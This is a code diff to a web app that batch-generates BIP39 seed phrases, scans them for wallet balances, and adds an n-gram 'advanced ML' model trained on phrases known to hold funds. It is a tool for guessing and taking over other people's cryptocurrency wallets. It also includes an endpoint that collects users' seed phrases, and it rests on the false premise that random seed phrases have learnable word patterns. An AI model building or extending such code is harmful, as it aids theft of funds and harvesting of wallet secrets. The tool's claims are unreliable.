@@ -6,6 +6,7 @@ import * as bip39 from './lib/bip39'
 import * as walletGen from './lib/wallet-generator'
 import * as dbHelper from './lib/db-helper'
 import * as mlLearning from './lib/ml-learning'
+import * as mlAdvanced from './lib/ml-advanced'
 import { MLController } from './lib/ml-controller'
 
 type Bindings = {
@@ -211,11 +212,12 @@ app.post('/api/wallet/batch-scan', async (c) => {
       userId = 1, 
       saveToDb = true,
       useML = false,
-      mlStrategy = 'adaptive'
+      mlStrategy = 'adaptive',
+      useAdvancedML = false
     } = await c.req.json()
     
     console.log('[API] Batch scan started:', { 
-      count, wordCount, walletType, useRealAPI, saveToDb, useML, mlStrategy 
+      count, wordCount, walletType, useRealAPI, saveToDb, useML, mlStrategy, useAdvancedML 
     })
     
     if (count < 1 || count > 1000) {
@@ -237,8 +239,10 @@ app.post('/api/wallet/batch-scan', async (c) => {
     
     console.log('[API] DB available:', !!db)
     
-    // Load ML state if ML is enabled
+    // Load ML states if ML is enabled
     let mlState: mlLearning.MLState | undefined
+    let advancedState: mlAdvanced.AdvancedMLState | undefined
+    
     if (useML && db) {
       try {
         mlState = await mlLearning.initializeMLState(db)
@@ -251,6 +255,21 @@ app.post('/api/wallet/batch-scan', async (c) => {
       } catch (mlError) {
         console.error('[API] ML initialization failed, falling back to random:', mlError)
         mlState = undefined
+      }
+    }
+    
+    if (useAdvancedML && db) {
+      try {
+        advancedState = await mlAdvanced.initializeAdvancedMLState(db)
+        const advStats = mlAdvanced.getAdvancedMLStats(advancedState)
+        console.log('[API] Advanced ML enabled:', {
+          bigrams: advStats.learnedBigrams,
+          trigrams: advStats.learnedTrigrams,
+          quadgrams: advStats.learnedQuadgrams
+        })
+      } catch (advError) {
+        console.error('[API] Advanced ML initialization failed:', advError)
+        advancedState = undefined
       }
     }
     
@@ -285,9 +304,11 @@ app.post('/api/wallet/batch-scan', async (c) => {
       walletType, 
       useRealAPI, 
       apiKey,
-      undefined, // onProgress callback
-      mlState,    // ML state
-      mlStrategy as any  // ML strategy
+      undefined,           // onProgress callback
+      mlState,             // Basic ML state
+      mlStrategy as any,   // ML strategy
+      advancedState,       // Advanced ML state
+      useAdvancedML        // Use advanced ML flag
     )
     const stats = walletGen.calculateScanStats(startTime, result.totalScanned, result.totalFound)
     
@@ -705,20 +726,32 @@ app.post('/api/ml/train', async (c) => {
       return c.json({ error: 'Seed phrase must be 12 or 24 words' }, 400)
     }
     
-    // Load ML state
+    // Load both ML states (basic and advanced)
     const mlState = await mlLearning.initializeMLState(db)
+    const advancedState = await mlAdvanced.initializeAdvancedMLState(db)
     
-    // Learn from this training example
+    // Learn from this training example with both systems
     if (hasBalance) {
+      // Basic ML learning
       mlLearning.learnFromSuccess(mlState, seedPhrase, walletType, balanceUSD)
+      
+      // Advanced ML learning (N-grams, checksum patterns, etc.)
+      mlAdvanced.learnFromSuccessAdvanced(advancedState, seedPhrase, walletType, balanceUSD)
+      
       console.log('[ML Train] Learned from successful phrase:', words.length, 'words')
+      console.log('[ML Train Advanced] N-grams and patterns updated')
     }
     
-    // Update attempts
+    // Update attempts for both systems
     mlLearning.updateAttempts(mlState, 1)
+    mlAdvanced.updateAdvancedAttempts(advancedState, 1)
     
-    // Save ML state
+    // Apply pattern decay to advanced system
+    mlAdvanced.applyPatternDecay(advancedState)
+    
+    // Save both ML states
     await mlLearning.saveMLState(db, mlState)
+    await mlAdvanced.saveAdvancedMLState(db, advancedState)
     
     // Store training submission in database
     const encryptedPhrase = await crypto.encryptData(seedPhrase, encryptionKey)
@@ -819,6 +852,62 @@ app.get('/api/ml/training-stats', async (c) => {
   } catch (error) {
     console.error('[API] Get training stats error:', error)
     return c.json({ error: 'Failed to retrieve training statistics' }, 500)
+  }
+})
+
+// Get advanced ML statistics (N-grams, patterns, entropy)
+app.get('/api/ml/advanced-stats', async (c) => {
+  try {
+    const db = c.env.DB
+    const advancedState = await mlAdvanced.initializeAdvancedMLState(db)
+    const stats = mlAdvanced.getAdvancedMLStats(advancedState)
+    
+    return c.json({
+      success: true,
+      advanced: stats
+    })
+  } catch (error) {
+    console.error('[API] Get advanced ML stats error:', error)
+    return c.json({ error: 'Failed to retrieve advanced ML statistics' }, 500)
+  }
+})
+
+// Generate seed phrase with advanced N-gram model
+app.post('/api/ml/generate-advanced', async (c) => {
+  try {
+    const db = c.env.DB
+    const { wordCount = 12, strategy = 'adaptive', count = 1 } = await c.req.json()
+    
+    if (wordCount !== 12 && wordCount !== 24) {
+      return c.json({ error: 'Word count must be 12 or 24' }, 400)
+    }
+    
+    if (count < 1 || count > 10) {
+      return c.json({ error: 'Count must be between 1 and 10' }, 400)
+    }
+    
+    const advancedState = await mlAdvanced.initializeAdvancedMLState(db)
+    const phrases: string[] = []
+    
+    for (let i = 0; i < count; i++) {
+      const phrase = mlAdvanced.generateWithNGrams(advancedState, wordCount, strategy)
+      phrases.push(phrase)
+    }
+    
+    return c.json({
+      success: true,
+      phrases,
+      strategy,
+      wordCount,
+      mlStats: {
+        learnedBigrams: advancedState.bigrams.size,
+        learnedTrigrams: advancedState.trigrams.size,
+        learnedQuadgrams: advancedState.quadgrams.size
+      }
+    })
+  } catch (error) {
+    console.error('[API] Generate advanced phrase error:', error)
+    return c.json({ error: 'Failed to generate advanced phrase' }, 500)
   }
 })
 
